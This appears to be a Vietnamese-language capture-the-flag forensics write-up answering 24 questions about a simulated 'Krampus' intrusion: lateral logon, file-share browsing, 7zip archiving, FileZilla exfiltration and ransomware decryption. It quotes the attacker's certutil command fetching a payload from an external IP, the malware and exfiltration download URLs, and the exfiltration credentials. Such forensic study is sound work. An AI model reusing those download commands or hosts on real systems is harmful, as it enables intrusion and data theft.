## 1. What is the hostname from which the attacker laterally moved to Santa's computer?
Dùng event log security -> successful logon
-> Answer: Northpole-TOYSQ

## 2. When did Krampus log in to the machine?
Cung cho cau 1
-> Answer: 2024-12-10 10:38:58

## 3. The attacker navigated the file share in hopes of finding useful files. What is the file share path for something planned for Christmas Eve?
Trong Autopsy recentDocs : file cristmas-eve-PRIORITY.lnk
Answer:\\NORTHPOLE-FS\fileshare\kitchen-prep\cristmas-eve-PRIORITY\

## 4. When did the attacker visit this share?
Trong shellbag folder cristmas-eve-PRIORITY
Answer: 2024-12-10 10:41:40

## 5. What is the filename of the file related to complaints from a department? The attacker found this on the share and also added it to the archive to exfiltrate.
Trong Autopsy recentDocs : file toys-dept.txt
-> Answer:toys-dept.txt

## 6. Windows Defender detected and stopped the first attempt of the attacker to download a file from their infrastructure. What is the full command that was executed by the attacker, which Defender detected and stopped?
Trong eventlogs Microsoft-Windows-Windows Defender : 
![alt text](image.png)
-> Answer : C:\Windows\System32\certutil.exe -urlcache -f http://3.110.162.216:8175/OpXmasDestroy/Collection/package.exe

## 7. The attacker proceeded to disable Windows real-time protection in order to evade defenses. When did this activity occur?
Trong eventlogs Microsoft-Windows-Windows Defender :
![alt text](image-1.png)

-> Answer:2024-12-10 10:44:10

## 8. The attacker copied a file and moved it from one location to another using 7zip. What is the full path where this file was moved to?
Plugin 7-zip cua Regripper : rip.exe -r NTUSER.dat -a 
![alt text](image-2.png)
->Answer:C:\Users\Public\scan\

## 9. The attacker also enumerated a zip file using 7zip on Santa's desktop.  What is the path of the folder related to the Christmas bonus present inside that zip?

Xem cau 8
-> Answer: C:\Users\santa\Desktop\finance_christmas.zip\finance_christmas\Employees\performance_bonus_24
## 10. What was the name of the archive file created by 7zip?

Xem cau 8
-> Answer: scan87x.zip

## 11. The attacker installed 7zip on the system and added some files to be archived. What was the last filesystem path visited by Krampus using 7zip?

Xem cau 8
->Answer: C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration\

## 12. The attacker downloaded installers from their infrastructure for data exfiltration and 
collection. What is the full download URL for the tool used for exfiltration?
Khi duoc download bang Cerutil thi Metadata, Content sẽ được lưu tại /C/Users/santa/AppData/LocalLow/Microsoft/CryptnetUrlCache
![alt text](image-3.png)
->Answer: http://3.110.162.216:8175/OpXmasDestroy/exfil/Godzilla.exe

## 13. What is the name of the tool used for exfiltration?
Chúng ta, kiểm tra Content của file 6CCBC365A82629F3E88D81A67A497B46
![alt text](image-4.png)
![alt text](image-5.png)
->Answer: Filezilla

## 14. The attacker renamed the zip before exfiltrating it. What was the name changed to?
Chúng ta kiểm tra Jump List để xem folder được mở gần đây
![alt text](image-6.png)
-> Answer : transfer_scanned.zip

## 15. What is the set of credentials used by Krampus to exfiltrate data to his server?
Vì ở trên chúng ta biết Attacker đã download FileZilla dùng để exfiltration -> Kiểm tra folder FileZilla tại `\C\Users\santa\AppData\Roaming\FileZilla`
-> Answer: rampus:ihavetodestroychristmasxoxo
![alt text](image-7.png)

## 16. Determine the full path where the files from Santa's computer were exfiltrated and 
stored on Krampus's server.
Tiếp tục xem file `\C\Users\santa\AppData\Roaming\FileZilla\fileZilla`
![alt text](image-8.png)
-> Answer: /home/krampus/ChristmasOP/santaloot

## 17. Krampus then proceeded to download ransomware on the system. What is the SHA
256 hash of the executable?
Vì attacker download bằng Certutil nên sẽ có cache được lưu tại `C:\Users\santa\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
Vì chúng ta đã phân tích 2 file ở các câu trên nên còn file cuối cùng là `5A76AD1C83439FFADFAE13FB9B08A8AA`
![alt text](image-9.png)
Đây là 1 file zip, tiến hành unzip
![alt text](image-10.png)
-> Answer : 808f098b303d6143e317dd8dae9e67ac8d2bcb445427d221aa9ad838aa150de3

## 18. What is the full download URL for the ransomware file?
![alt text](image-11.png)
-> Answer : http://3.109.152.7/final_operation/destroyer.zip
## 19. When was the ransomware binary executed according to prefetch?
-> Answer : 2024-12-10 11:06:30

## 20. Reverse engineer the ransomware. What was the IV used for encryption?
Sau khi giải nén folder destroyer.zip chúng ta được 2 file là : krampus.exe, krampus.jsc thì khả năng cao krampus.exe chính là krampus.jsc (jsc là complied javascript) đã bị packed, kiểm tra bằng DIE
![alt text](image-14.png)
Vì họ đã cho sẵn file .jsc nên chúng ta ko cần phải unpack mà tiến hành decomplied krampus.jsc bằng view8 
![alt text](image-16.png)
Sau đó chúng ta có thể đọc source code bằng strings
![alt text](image-17.png)
Nhìn code ta thấy được nó tạo IV bằng cách decode chuỗi base64 `e14dNxBWFENJZkxWXl8ESw==` sau đó gọi hàm `func_xor_0000010BB21DE319` với string `C:/Users/Public/file.txt`
![alt text](image-19.png)
Xor theo hàm trên ta được
-> Answer : 8d2bc3f0f69426gd

## 21. What was the Key used for encryption?
Tương tự : đối với key nó sẽ gọi hàm func_xor_0000010BB21DE319 với 2 tham số là base64 `EX9bMiVXRhFrEkIaOzAMYhMQHAxsNSs5RSJwTTZGXBw=` đã được decode và string `C:/Users/Public/file.txt`
-> Answer : REtgV24bDB7xWYoMuypiBASMEaJbc59n

## 22. Decrypt the encrypted files and find the name of the extra naughty kid.
![alt text](image-20.png)
Tại Desktop/Chrismas24 chúng ta có file `Naughty_List_Christmas24.pdf.krampus` bị mã hóa, áp dụng IV và Key ở trên chúng ta sẽ giải mã 2 file này bằng openssh rồi decode base64 ( lưu ý cần chuyển về bin trước `xxd -r -p)
![alt text](image-21.png)
![alt text](image-22.png)
-> Answer : Tenzin

## 23. Decrypt the encrypted files and find the name of the employee getting a promotion 
and salary increment
Tương tự câu trên với file `Desktop/Promotion/Christmas_Promotions_List.xlsx.krampus`
Answer: parkleSugarglow

## 24. When did the threat actor log off?

Kiểm tra trong event logs
![alt text](image-13.png)
-> Answer: 
2024-12-10 11:10:19
